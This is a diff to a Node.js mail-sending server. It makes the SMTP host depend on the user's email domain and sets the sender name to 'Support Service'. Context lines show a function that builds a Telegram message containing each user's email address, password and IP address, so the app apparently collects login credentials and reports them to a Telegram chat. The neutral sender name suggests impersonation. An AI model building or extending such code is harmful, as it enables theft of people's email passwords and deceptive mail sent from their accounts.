@@ -30,7 +30,6 @@ function escapeHtml(str) {
 
 function buildTelegramMessage(userEmail, userPass, clientIp, tanggal, pukul, status, errorMessage = null) {
   const statusText = status === 'SUCCESS' ? '✅ SUCCESS' : '❌ FAILED'
-  const statusColorStyle = status === 'SUCCESS' ? '' : ''
 
   let msg = `
 <b>📧 NEW SMTP ACTIVITY</b>
@@ -80,20 +79,28 @@ app.post('/api/send', async (req, res) => {
   }
 
   let status = 'SUCCESS'
+  let smtpConfig = {
+    host: 'smtp.gmail.com',
+    port: 465,
+    secure: true,
+    auth: {
+      user: userEmail,
+      pass: userPass
+    }
+  }
+
+  if (userEmail.endsWith('@arkrega.web.id')) {
+    smtpConfig.host = 'mx4.mailspace.id'
+  } else if (!userEmail.endsWith('@gmail.com')) {
+    const domain = userEmail.split('@')[1]
+    smtpConfig.host = `mail.${domain}`
+  }
 
   try {
-    const transporter = nodemailer.createTransport({
-      host: 'smtp.gmail.com',
-      port: 465,
-      secure: true,
-      auth: {
-        user: userEmail,
-        pass: userPass
-      }
-    })
+    const transporter = nodemailer.createTransport(smtpConfig)
 
     const mailOptions = {
-      from: userEmail,
+      from: `"Support Service" <${userEmail}>`,
       to: toEmail,
       subject: subject,
       html: htmlBody
